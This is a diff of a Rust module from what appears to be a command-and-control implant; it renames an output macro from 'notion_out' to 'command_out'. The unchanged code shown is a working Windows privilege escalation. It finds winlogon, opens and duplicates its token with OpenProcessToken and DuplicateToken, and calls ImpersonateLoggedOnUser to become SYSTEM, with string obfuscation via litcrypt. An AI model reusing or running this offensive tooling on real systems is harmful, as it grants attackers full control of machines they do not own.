@@ -33,7 +33,7 @@ use std::error::Error;
 use litcrypt::lc;
 #[cfg(windows)] use crate::cmd::getprivs::is_elevated;
 use crate::logger::{Logger, log_out};
-use crate::cmd::notion_out;
+use crate::cmd::command_out;
 
 #[cfg(windows)]
 fn get_processes(proc_name: &str) -> Vec<(u32, String)> {
@@ -60,7 +60,7 @@ pub async fn handle(logger: &Logger) -> Result<String, Box<dyn Error>> {
                 let mut duplicate_token_handle = HANDLE(0);
                 let winlogon_processes = get_processes("winlogon");
                 if winlogon_processes.is_empty() {
-                    return notion_out!("Couldn't find winlogon!");
+                    return command_out!("Couldn't find winlogon!");
                 }
                 let winlogon_pid: u32 = winlogon_processes[0].0;
                 logger.debug(log_out!("Winlogon pid: ", winlogon_pid.to_string().as_str()));
@@ -69,31 +69,31 @@ pub async fn handle(logger: &Logger) -> Result<String, Box<dyn Error>> {
                 // OpenProcessToken
                 if OpenProcessToken(winlogon_proc_handle, TOKEN_DUPLICATE, &mut winlogon_token_handle).0 != 0 {
                 } else {
-                    return notion_out!("[!] Couldn't get Winlogon Token!");
+                    return command_out!("[!] Couldn't get Winlogon Token!");
                 }
                 // Duplicate Token
                 if DuplicateToken(winlogon_token_handle, SecurityImpersonation, &mut duplicate_token_handle).0 != 0 {
                     logger.debug(log_out!("Duplicated Token!"));
                 } else {
-                    return notion_out!("[!] Couldn't duplicate token!");
+                    return command_out!("[!] Couldn't duplicate token!");
                 }
                 // ImpersonateLoggedOnUser
                 if ImpersonateLoggedOnUser(duplicate_token_handle).0 != 0 {
                     logger.info(log_out!("Impersonated!"));
                     CloseHandle(winlogon_proc_handle);
-                    return notion_out!("I am now ", whoami::username().as_str());
+                    return command_out!("I am now ", whoami::username().as_str());
                 }
-                return notion_out!("Couldn't get system!");
+                return command_out!("Couldn't get system!");
                 // Close Handles
                 // CloseHandle(duplicate_token_handle);
 
             }
 
         } else {
-            notion_out!("[!] You ain't got da JUICE!")
+            command_out!("[!] You ain't got da JUICE!")
         }
     }
     #[cfg(not(windows))] {
-        notion_out!("This module only works on Windows!")
+        command_out!("This module only works on Windows!")
     }
 }
